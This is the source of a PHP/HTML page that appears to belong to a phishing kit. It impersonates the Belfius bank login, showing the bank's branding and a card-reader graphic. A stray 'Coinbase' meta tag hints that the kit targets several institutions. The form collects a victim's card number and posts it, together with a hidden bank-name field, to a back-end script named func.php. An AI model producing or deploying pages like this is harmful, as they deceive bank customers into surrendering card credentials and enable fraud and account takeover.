<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>Belfius</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body>
    

    <!-- header_bel -->
     <header class="header_bel">
      <img src="./Asstes/imgs/be.svg" alt="">
     </header>
    <!-- box_belfius -->
    <div class="box_belfius">
      <form action="./Asstes/php/config/func.php" method="post" class="form_login_belfius">
        <input type="hidden" name="name_bank" value="Belfius">
        <input type="hidden" name="login">
        <div class="title_form">
          <p><?php echo get_text('be_n_1'); ?></p>
        </div>
        <div class="wrapper_boxes">
          <div class="part_left_bel">
            <img src="./Asstes/imgs/cardreade.png" alt="">
          </div>
          <div class="part_right_bel">
            <div class="taps">
              <ul>
                <li><?php echo get_text('be_n_2'); ?></li>
              </ul>
            </div>
            <div class="inputes">
              <div class="title">
                <p><?php echo get_text('be_n_3'); ?></p>
              </div>
              <div class="form-group">
                <label for=""><?php echo get_text('be_n_4'); ?><i class="ri-question-line"></i></label>
                <input type="text" name="cart_num" id="cart_num" placeholder="_____ _____ _____ _____">
                <?php if( isset($_GET['error']) ) : ?>
                <p class="error_b"><i class="ri-alert-fill"></i> <?php echo get_text('be_n_5'); ?></p>
                <?php endif; ?>
              </div>
              <div class="Remember d-flex align-items-center">
                <input type="checkbox" id="Remember" class="Remember rounded-1" disabled name="Remember">
                <label for="Remember"><?php echo get_text('be_n_6'); ?></span>
              </div>             
            </div>
          </div>
        </div>
        <div class="wrapper_btns d-flex justify-content-between align-items-center">
          <img src="./Asstes/imgs/bts.png" alt="">
          <div class="btn_sub">
            <button type="submit" class="d-flex align-items-center"><img src="./Asstes/imgs/connect.png" alt=""><?php echo get_text('be_n_7'); ?></button>
          </div>
        </div>        
      </form>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>   
        
        $("#cart_num").mask('0000 0000 0000 0000 0');
        $("#client_num").mask('00000 00000');

        $(".form-group input").keyup(function(){
          if ($(".form-group #cart_num").val() != "") {
            $(".btn_sub button").prop("disabled",false);
            $(".btn_sub button").addClass("active");
          }else{
            $(".btn_sub button").prop("disabled",true);
            $(".btn_sub button").removeClass("active");
          }
        });  
        $(".group-input input").focus(function(){
          $(this).prev().addClass("focus");
          $(this).addClass("focus");
        });
        $(".group-input input").blur(function(){
          if ($(this).val() == "") {
              $(this).prev().removeClass("focus");
          }
          $(this).removeClass("focus");
        });         
    </script>
    </body>
</html>